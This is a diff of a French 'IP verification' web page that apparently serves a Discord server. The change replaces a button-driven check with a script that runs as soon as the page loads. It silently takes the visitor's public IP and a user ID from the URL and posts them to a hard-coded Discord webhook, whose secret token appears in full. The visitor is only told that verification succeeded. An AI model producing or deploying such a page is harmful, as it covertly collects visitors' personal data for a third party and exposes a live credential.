@@ -2,84 +2,50 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification d'IP et Inscription</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f4f4f4;
-        }
-        #container {
-            text-align: center;
-            padding: 20px;
-            border: 1px solid #ddd;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 300px;
-        }
-        h1 {
-            font-size: 20px;
-            color: #333;
-        }
-        #result {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #555;
-        }
-        button {
-            margin-top: 10px;
-            padding: 8px;
-            width: 100%;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-    </style>
-</head>
-<body>
-    <div id="container">
-        <h1>Vérification de l'IP</h1>
-        <button onclick="checkIP()">Vérifier l'IP et valider l'inscription</button>
-        <div id="result"></div>
-    </div>
-
+    <title>Vérification d'IP</title>
     <script>
-        function checkIP() {
-            // Récupérer l'IP de l'utilisateur
-            fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
+        document.addEventListener("DOMContentLoaded", function() {
+            // Extraire l'identifiant utilisateur de l'URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('user_id');
 
-                    // Envoyer l'IP au backend Flask
-                    fetch("http://localhost:5000/verify", {  // Votre backend Python
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({ ip: userIP })
-                    })
+            if (userId) {
+                // Récupérer l'IP de l'utilisateur
+                fetch("https://api.ipify.org?format=json")
                     .then(response => response.json())
                     .then(data => {
-                        console.log(data.message);
-                        document.getElementById("result").innerText = data.message;
+                        const userIP = data.ip;
+
+                        // Envoi de l'IP et de l'identifiant utilisateur au webhook Discord
+                        fetch("https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                content: `Vérification réussie pour l'utilisateur <@${userId}>. IP : ${userIP}`
+                            })
+                        })
+                        .then(() => {
+                            document.body.innerHTML = "<h2>Vérification réussie ! Vous pouvez retourner sur Discord.</h2>";
+                        })
+                        .catch(error => {
+                            console.error("Erreur lors de l'envoi de l'IP:", error);
+                            document.body.innerHTML = "<h2>Erreur lors de la vérification.</h2>";
+                        });
                     })
                     .catch(error => {
-                        console.error("Erreur lors de l'envoi au backend:", error);
-                        document.getElementById("result").innerText = "Erreur lors de la validation.";
+                        console.error("Erreur lors de la récupération de l'IP:", error);
+                        document.body.innerHTML = "<h2>Erreur lors de la récupération de votre IP.</h2>";
                     });
-                })
-                .catch(error => {
-                    console.error("Erreur lors de la récupération de l'IP:", error);
-                    document.getElementById("result").innerText = "Erreur lors de la récupération de l'IP.";
-                });
-        }
+            } else {
+                document.body.innerHTML = "<h2>Erreur : utilisateur non identifié.</h2>";
+            }
+        });
     </script>
+</head>
+<body>
+    <h1>Vérification en cours...</h1>
 </body>
 </html>
+
